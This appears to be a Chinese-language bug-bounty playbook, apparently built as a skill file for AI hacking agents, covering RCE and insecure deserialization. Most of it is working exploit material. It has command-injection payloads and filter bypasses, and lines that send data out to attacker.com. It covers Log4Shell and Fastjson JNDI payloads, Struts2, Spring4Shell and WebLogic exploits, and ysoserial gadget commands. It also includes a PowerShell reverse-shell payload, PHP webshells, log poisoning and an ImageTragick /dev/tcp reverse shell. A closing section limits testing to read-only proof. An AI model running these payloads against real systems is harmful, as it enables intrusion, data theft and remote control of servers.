# RCE / 反序列化（Remote Code Execution & Insecure Deserialization）

> 把「用户输入」提升为「服务器端指令执行」。未授权 RCE 是所有漏洞类型中赏金最高的一档（通常 $5k–$50k+），反序列化 RCE 几乎总是 Critical——无需前置条件即可直接命令执行。本 playbook 覆盖：命令注入 / 框架 RCE 指纹（Struts2、Log4Shell、Spring4Shell、Fastjson、Shiro、WebLogic 等）/ 反序列化 / 文件上传→RCE 链。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)（00-index / 10-framework / 11-command-injection / 12-deserialization / 13-file-rce-chain）
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)、`hunt-deserialization/SKILL.md`
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)、`offensive-deserialization/`
- 权威公开源：PayloadsAllTheThings / PortSwigger Web Security Academy / HackTricks / OWASP

---

## 1. 触发信号

- **命令注入**：网络诊断（ping/nslookup/traceroute）、文件解压/转换、图片处理、URL 抓取、DNS 查询等「把用户输入拼进系统命令」的功能；参数加 `;`/`|` 后响应长度/时间出现可复现差异。
- **框架 RCE 指纹**（命中后直接查 §4 对应章节）：
  - Struts2：URL 含 `.action`/`.do`，响应 `Server: Apache-Coyote`
  - Log4Shell：任何会被记日志的输入点（User-Agent/Referer/用户名/上传文件名）
  - Spring4Shell：`Server: spring` / `X-Application-Context`
  - Fastjson：响应/错误页含 `com.alibaba.fastjson` 或 `fastjson`
  - Shiro：响应 `Set-Cookie: rememberMe=deleteMe`
  - WebLogic：7001 端口 + `/console/`、`/wls-wsat/`、`/_async/`
  - JBoss：`/jmx-console/`、`/invoker/`；Tomcat：8080 + `/manager/html`
- **反序列化**：Cookie/ViewState 含 `rO0AB`（base64）或 `ac ed 00 05`（hex，Java）；`O:` 开头（PHP）；pickle 以 `\x80\x04` 开头；`.NET` 以 `AAEAAAD/////` 开头。
- **私有二进制协议**（非 HTTP 入口）：非标 TCP 端口返回 `NAME_VERSION;` 类 banner、任意输入回 `ERROR_UNKNOWN_COMMAND;`——服务端可能直接反序列化客户端上送对象；客户端逆向定位格式化器与协议格式（见 `references/notes/dotnet-client-re.md`）。
- **文件上传→RCE**：上传点 + 解析配合（Apache 多后缀 / Nginx `fix_pathinfo` / IIS 解析）+ LFI/日志投毒/图片马/.htaccess。

## 2. 高频入口点

**命令注入入口**（WooYun 案例统计，见本地 src-hunter rce/00-index.md §2.2）：

| 功能 | 案例数 | 参数 |
|---|---|---|
| 文件操作（解压/转换） | 34 | `filename` `path` |
| 网络诊断（ping/nslookup/traceroute） | 13 | `host` `ip` `target` |
| 图片处理 | 12 | `image` `file` |
| URL 抓取 | 12 | `url` `callback` |
| DNS 查询 | 8 | `domain` |
| 备份/任务调度 | — | `cmd` `task` `job` |

**框架 / 中间件类**（src-hunter rce/00-index.md §2.1）：

| 类型 | 案例数 | 入口指纹 |
|---|---|---|
| Struts2 | 23 | URL 含 `.action`/`.do` |
| JBoss | 9 | `/jmx-console/` `/invoker/` |
| Tomcat | 9 | 8080 + `/manager/html` |
| ElasticSearch | 8 | 9200 + Lucene 1.x |
| WebLogic | 5 | 7001 + `/console/` |
| Redis | 4 | 6379 |
| Spring | 4 | `Server: spring` |
| Zabbix | 2 | `Zabbix SIA` |
| Fastjson / Log4j / Jenkins | — | 指纹见触发信号 |

**反序列化入口**（src-hunter rce/00-index.md §2.3）：Java Cookie/Authorization/ViewState 含 `rO0AB`；PHP `unserialize()` + `phar://`；Python `pickle.loads()` / `yaml.load()`；Ruby `Marshal.load()`。

**Log4Shell 插入点**（所有会被记日志的字段都打）：`User-Agent`、`Referer`、`X-Forwarded-For`、`X-Api-Version`、`Cookie`、用户名/邮箱、上传文件名、chat/comment/search 关键词。

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **命令注入探针**：先拼接符（`;`/`|`/`&&`/`` ` ``/`$()`）看有无回显；无回显用时间盲 `sleep 5`（Linux）/`timeout 5`（Windows）；出网场景用 DNSLog 外带 `ping -c 1 \`whoami\`.xxx.dnslog.cn`。观察「什么算命中」：响应体出现 `uid=33(www-data)` 或 DNSLog 收到记录。
2. **框架指纹 → 对应链**：命中 Log4j/Spring/Fastjson/Struts2/Shiro/WebLogic 后直接挑 §4 对应 H3 取探针，先用 DNS 探针（如 `${jndi:dns://...}`、`{"@type":"java.net.Inet4Address","val":"..."}`）证明解析，再升级。
3. **反序列化**：先用 `ysoserial URLDNS` 做出网证明（最无害），确认 `rO0AB`/`ac ed 00 05` 格式后，按 classpath 依赖挑 gadget chain；绝不直接 reverse shell。
4. **上传→解析链**：图片马 → Apache/Nginx/IIS 解析配合 → 访问触发；有 LFI 时走日志投毒 / `php://input` / phar://。
5. **拿最小证据**：只跑只读命令 `id`/`whoami`/`hostname`/`uname -a`，或一次 DNS 外带，即停；不做提权/横向。

## 4. Payload 区（每条标注出处）

### 4.1 命令注入探测 `[本地 src-hunter 11-command-injection.md]`

```bash
; id            # 分号（Unix 最常见）
| id            # 管道
`id`            # 反引号
$(id)           # 子 shell
&& id           # 逻辑与
|| id           # 逻辑或
test;id         # 拼接在正常值后
# 时间盲（无回显）
; sleep 5
; ping -c 5 attacker.com
& timeout 5                     # Windows
# DNSLog / HTTP 外带
; curl http://attacker.com/?data=$(whoami)
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).xxx.dnslog.cn
```

### 4.2 命令注入 Bypass 矩阵 `[本地 src-hunter 11-command-injection.md / Claude-Red offensive-rce]`

| 拦截 | 绕过 |
|---|---|
| 空格 | `${IFS}` `${IFS}$9` `%09` `{cat,/etc/passwd}` `cat</etc/passwd` |
| `cat` 关键字 | `c''at` `c\at` `c"a"t` `/bin/c?t` `/???/??t` `tac` |
| `;`/`\|` 过滤 | `%0a` `%0d` `&&` `\|\|` 反引号 |
| 命令字过滤 | base64：`echo Y2F0IC9ldGMvcGFzc3dk \| base64 -d \| sh` |
| 出网拦截 | DNS 外带（53 端口几乎不拦） |
| WAF 关键字 | `WhOaMi` 大小写 / `whoami` / `wh\x6fami` / `a=w;b=hoami;$a$b` |

### 4.3 Log4Shell（CVE-2021-44228）`[本地 src-hunter 00-index.md §3.3 / 10-framework.md]`

影响 Log4j 2.0–2.14.1，修复 2.17.0+（2.15/2.16 仍有绕过），CVSS 10.0。**每个会被记日志的字段都试**：

```bash
${jndi:ldap://xxx.dnslog.cn/a}
${jndi:dns://xxx.dnslog.cn/a}          # 不需出网 LDAP，DNS 即可
${jndi:rmi://xxx.dnslog.cn:1099/a}
# 带数据外带
${jndi:ldap://${env:USER}.xxx.dnslog.cn/a}
${jndi:ldap://${sys:java.version}.xxx.dnslog.cn/a}
# WAF 绕过
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://x.dnslog.cn/a}
${${lower:j}ndi:${lower:l}dap://x.dnslog.cn/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//x.dnslog.cn/a}
```

DNSLog 收到记录 = 命中；**只用 DNS 外带证明触发，不用 LDAP gadget 实际加载远程类**。

### 4.4 框架 RCE 指纹探针

**Fastjson** `[本地 src-hunter 00-index.md §3.5/§6.3]`

```json
{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}
{"@type":"java.net.URL","val":"http://xxx.dnslog.cn"}
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnslog.cn/a","autoCommit":true}
```

DNSLog 收到 = 至少解析了 `@type`；版本→绕过链演进（前两行原有，其余按版本选 payload 的补充，来源：中间件及其漏洞）：

| 版本 | 绕过 |
|---|---|
| `≤1.2.24` | 无 AutoType 限制，直接利用（CVE-2017-18349） |
| `1.2.25–1.2.41` | 黑名单；**类名前加 `L`、末尾加 `;`** 绕过前缀检测 |
| `1.2.42` | 前缀检测改 hash 判断 → **`LL...;;` 双写** |
| `1.2.25–1.2.47` | `java.lang.Class` 缓存绕过（CVE-2019-12384，下链） |
| `1.2.68` | safeMode 半开关 → **expectClass** 绕过 |
| `1.2.80` | 修复 expectClass → **异常类链**绕过 |

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
 "b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x/a","autoCommit":true}}
```

**Apache Shiro（RememberMe）** `[本地 src-hunter 10-framework.md]`

指纹：响应 `Set-Cookie: rememberMe=deleteMe`。用 ysoserial 生成 payload 后以 AES-CBC（key 作 IV）加密；常见默认密钥 `kPH+bIxk5D2deZiIxcaaaA==`（另有 `4AvVhmFLUs0KTA3Kprsdag==` 等）。

```bash
java -jar ysoserial.jar CommonsCollections2 "id" > payload.ser
curl -H "Cookie: rememberMe=<AES加密后的base64>" http://target
```

**Shiro-721（CVE-2019-12422，默认密钥打不动时的备选）**：无需知道密钥——利用 AES-CBC Padding Oracle（rememberMe 解密失败 500 / 成功 200 的响应差分）逐字节推算合法密文，影响 <1.4.2。价值：密钥爆破失败 ≠ 死路，721 仍可打（来源：中间件及其漏洞）。

**Struts2（OGNL）** `[本地 src-hunter 00-index.md §3.7/§6.4 / 10-framework.md]`

系列：S2-045/S2-046（CVE-2017-5638，Content-Type/Content-Disposition）、S2-057（CVE-2018-11776，namespace）、S2-052（REST 插件 XML 反序列化）、S2-061/062（CVE-2020-17530）。通用无回显探针（响应 Header 出现 `X-Test: 15129` = 命中）：

```
POST / HTTP/1.1
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

S2-057 探针：`http://target/${(111+111)}/test.action` 返回 222 = 存在。S2-045 完整 RCE 见 src-hunter 00-index.md §3.7（长 OGNL 链，`#cmd='id'` + ProcessBuilder + IOUtils 回显）。

**Spring / Spring4Shell** `[本地 src-hunter 00-index.md §3.6 / 10-framework.md / Claude-BugHunter hunt-rce]`

Spring4Shell（CVE-2022-22965）：JDK 9+ + Spring 5.3.0–5.3.17 / 5.2.0–5.2.19 + WAR 部署，CVSS 9.8。

```
POST /vulnerable
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=test
```

200 + 不报错 = 可能存在（配合 Tomcat AccessLogValve 写 webshell）。SpEL 注入探针 `${7*7}`/`#{7*7}`，RCE `${T(java.lang.Runtime).getRuntime().exec("id")}`。Spring Cloud Function（CVE-2022-22963）：

```bash
curl -X POST http://target:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \
  --data "x"
```

**WebLogic** `[本地 src-hunter 00-index.md §6.10 / 10-framework.md]`

| CVE | 触发 |
|---|---|
| CVE-2017-10271 | `/wls-wsat/CoordinatorPortType` SOAP XMLDecoder |
| CVE-2019-2725 | `/_async/AsyncResponseService` |
| CVE-2018-2628 | T3 反序列化 |
| CVE-2020-2551 | IIOP |
| CVE-2020-14882 | 后台 RCE（路径编码绕过 admin） |

T3 探测：`echo "t3 12.2.1" | nc target 7001`，返回 `HELO` 即存在 T3 服务。XMLDecoder 核心（`<void class="java.lang.ProcessBuilder">` + `<array class="java.lang.String">` + `<void method="start"/>`），完整 SOAP 包见 10-framework.md。

**Drupal（历史 RCE，CMS 指纹确认后）** `[本地 Windows/Linux 提权专区 Bastard 段]`：CHANGELOG.txt 定版本 → 命中范围（Drupal <7.58 / <8.3.9，CVE-2018-7600 演化族）→ `searchsploit drupal` 取 exp 副本（**用 searchsploit/exploitdb 副本，不用 github 随手下载的 exp——实测会崩靶机**）→ `searchsploit -m 44449` 后 `ruby 44449.rb http://target`。

### 4.5 反序列化

**Java（ysoserial）** `[本地 src-hunter 00-index.md §3.4 / 12-deserialization.md / Claude-BugHunter hunt-deserialization]`

```bash
# 验证 Java 序列化
echo "input" | base64 -d | xxd | head -1     # ac ed 00 05 = Java serialized
# 出网证明（最无害，先做这个）
java -jar ysoserial-all.jar URLDNS "http://xxx.dnslog.cn"
# 常见 gadget chain（按依赖挑）
ysoserial CommonsCollections1  / CommonsCollections5 / CommonsCollections6
ysoserial CommonsBeanutils1  / Hibernate1 / Spring1
ysoserial Jdk7u21            # JDK 自带
```

把生成的 base64 放到 Cookie / ViewState / Authorization。**禁用 reverse shell，只做 URLDNS 出网证明**。

**PHP 反序列化** `[本地 src-hunter 12-deserialization.md]`

指纹：`O:` 开头。魔术方法：`__wakeup()`/`__destruct()`/`__toString()`/`__call()`。POP 链由 `serialize()` 生成；`phar://` 协议触发自动反序列化（`phar://exploit.phar/test.txt`）。属性修饰符差异：public `s:3:"cmd"`、private `s:8:"\0Class\0cmd"`、protected `s:7:"\0*\0cmd"`。工具 `phpggc`：

```bash
php phpggc -l                    # 列出 gadget chain
php phpggc Laravel/RCE5 system id | base64
```

**Python pickle** `[本地 src-hunter 00-index.md §3.4 / Claude-Red offensive-deserialization]`

```python
import pickle, os, base64
class Exp:
    def __reduce__(self):
        return (os.system, ("curl xxx.dnslog.cn",))
print(base64.b64encode(pickle.dumps(Exp())))
```

**Ruby / .NET** `[本地 src-hunter 00-index.md / Claude-BugHunter]`

Ruby `Marshal.load()` 接 cookie/参数（Gadget：`Gem::Installer`/`Gem::Requirement`）。.NET 用 ysoserial.net：`ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc"`；未加密 ViewState（`__VIEWSTATEENCRYPTED=""`）+ 泄露 machineKey → `TypeConfuseDelegate` 链 RCE。

**.NET 反序列化实操补充**（来源：反序列化 ysoserial.net 篇 / HTB-Pov / HTB-Json）：

- **ysoserial.net 参数语义**：`-c` 命令、`-o` 输出格式（base64）、`-g` gadget（`ObjectDataProvider`/`TextFormattingRunProperties`/`WindowsIdentity`）、`-f` 序列化框架（`Json.Net` 等格式化器）。验证存在（无回显用 ping 计数+kali tshark 抓 ICMP）：

```bash
.\ysoserial.exe -c "ping -n 10 10.10.16.155" -o base64 -g ObjectDataProvider -f Json.Net
```

- **Json.NET 定位法**：报错含 `Cannot deserialize Json.Net Object` 类字样即 Json.NET 反序列化入口（HTB-Json）。
- **ViewState 生成全参数**（path/apppath 与两种 key 都参与密钥派生，缺一签不出合法 ViewState；HTB-Pov，前置：LFI 读 web.config 拿 machineKey）：

```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping -n 5 10.10.16.58" --path="/portfolio/default.aspx" --apppath="/portfolio" --decryptionalg="AES" --decryptionkey="<web.config>" --validationalg="SHA1" --validationkey="<web.config>"
```

- **`START /B`**：Windows 不弹窗后台执行，测试期静默验证（`START /B \\IP\share\nc64.exe ... -e cmd.exe`）。

- **BinaryFormatter 走私有 TCP 协议**（非 HTTP 入口，来源：HTB-Scrambled）：非标端口 banner `SCRAMBLECORP_ORDERS_V1.0.3;`、未知命令回 `ERROR_UNKNOWN_COMMAND;`。客户端 dnSpy 逆向确认服务端对上送对象直接 `BinaryFormatter.Deserialize()` 后，用 ysoserial.net 按 `-f BinaryFormatter -g WindowsIdentity` 生成载荷（`-c` 命令用 PowerShell base64 反弹见 `references/notes/field-ops-toolbox.md` §3），再按协议格式裸 TCP 投递——工具链与协议还原见 `references/notes/dotnet-client-re.md`：

```bash
.\ysoserial.exe -c "powershell -nop -w hidden -enc <PS反弹b64>" -o base64 -g WindowsIdentity -f BinaryFormatter
# nc 连上服务端口后按协议上送：UPLOAD_ORDER;<ysoserial base64 payload>
```

### 4.6 文件上传 → RCE 链 `[本地 src-hunter 13-file-rce-chain.md / Claude-Red offensive-rce]`

```
1. 上传图片马（GIF89a + <?php @eval($_POST[c]);?>）→ shell.jpg
2. 解析配合触发：
   - Apache 多后缀：shell.php.x → 当 PHP
   - Nginx fix_pathinfo：shell.jpg/.php → PHP-CGI
   - IIS6：shell.asp;.jpg → 当 ASP
3. 访问触发 → RCE
```

- 扩展名绕过：`.php → .phtml/.php3/.php5/.pht`、大小写 `.Php`、双写 `.pphphp`、`%00` 截断（PHP<5.3）。
- `.htaccess`：`AddType application/x-httpd-php .jpg` 使后续 jpg 当 PHP 执行。
- 日志投毒：`curl -A "<?php system(\$_GET['cmd']);?>" http://target/` 后包含 `?file=/var/log/apache2/access.log&cmd=whoami`。
- LFI 伪协议：`?file=php://input`（POST 体放 PHP）、`?file=data://text/plain,<?php system('whoami');?>`。
- Apache 路径穿越（CVE-2021-41773 / 2.4.50 绕过 CVE-2021-42013，仅 2.4.49/2.4.50）`[Claude-BugHunter hunt-rce]`：

```bash
curl --path-as-is "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -X POST \
  -d "echo Content-Type: text/plain; echo; id; uname -a; hostname"
```

- ImageMagick ImageTragick（CVE-2016-3714）：上传 `.mvg` / 含 EXIF SVG，`fill 'url(https://example.com/"|bash -i >& /dev/tcp/x/x 0>&1")'` `[本地 src-hunter 00-index.md §6.5]`。

### 4.7 Bypass 矩阵（跨类速记）`[本地 src-hunter 00-index.md §4]`

| 拦 | 绕 |
|---|---|
| 空格 | `${IFS}` / `%09` / `{cat,/etc/passwd}` |
| 关键字 `jndi` | `${${lower:j}ndi:...}` / `${${::-j}ndi:...}` |
| 长度限制 | 短域名 / `id\|nc x.cc 80` |
| WAF 拦 `exec/system` | Ruby `send(:system,"id")` / `Kernel.send(:`,"id")` `[Claude-BugHunter]` |

## 5. 工具用法

```bash
# 命令注入自动化（手工确认后扩大覆盖）
commix -u "https://target/api/ping?host=127.0.0.1" --batch
commix -r request.txt --batch

# 反序列化
java -jar ysoserial-all.jar URLDNS "http://xxx.dnslog.cn" | base64 -w0
php phpggc -l && php phpggc Laravel/RCE5 system id

# OOB 监听 / JNDI 套件
interactsh-client -v -n 5
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# 指纹/漏扫（先打指纹再手测，不盲跑）
nuclei -u https://target -t cves/2021/CVE-2021-44228.yaml
nuclei -u https://target -t cves/2022/CVE-2022-22965.yaml
```

> 纪律：先 DNS 外带证明，再决定是否升级；`--batch` 前先单包手工确认；nuclei 只跑指纹模板不做破坏性 PoC。

## 6. 证据要求

**「已确认」必须满足**：响应体出现 `uid=33(www-data) gid=33(www-data)`（命令输出，HTML 包裹也算）；或 DNSLog 收到带时间/源 IP/域名 的带外记录；或 `${jndi:dns://...}` / Fastjson `Inet4Address` 触发 DNS 回调。保存完整 HTTP 请求/响应 + 截图 + 计时/DNSLog 截图。

**PoC 模板（命令注入）**：

```http
POST /api/util/ping HTTP/1.1
Host: target.com
body: {"host":"127.0.0.1; id"}
→ 响应：PING 127.0.0.1 ... uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**CVSS 参考**：未授权 RCE `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical`；认证后 RCE `PR:L = 8.8 High`；反序列化 RCE 同 9.8（几乎总是 Critical）。

## 7. 合规边界 / 不要做的事

- **禁**：在目标上反弹 shell。**只跑只读命令**：`id`/`whoami`/`uname -a`/`cat /etc/issue`。
- **禁**：写入文件 / 留 webshell / 改任何文件 / `outfile` 写 shell。
- **禁**：尝试提权（sudo/SUID/kernel exploit）或横向（读内网凭据、ssh key）。
- **禁**：访问 `/etc/shadow`、SSH 私钥、生产数据库凭据。
- **禁**：Log4Shell/Fastjson 用 LDAP gadget 实际加载远程类——只用 DNS 外带证明触发。
- **禁**：用 ysoserial 实际发起 reverse shell；用 `URLDNS` gadget 仅做出网证明。
- **脱敏**：报告中的主机名/内网 IP/用户名脱敏到看不出具体业务；命令输出只贴必要片段。
- **限速**：单测试 1–2 rps，避免触发风控。
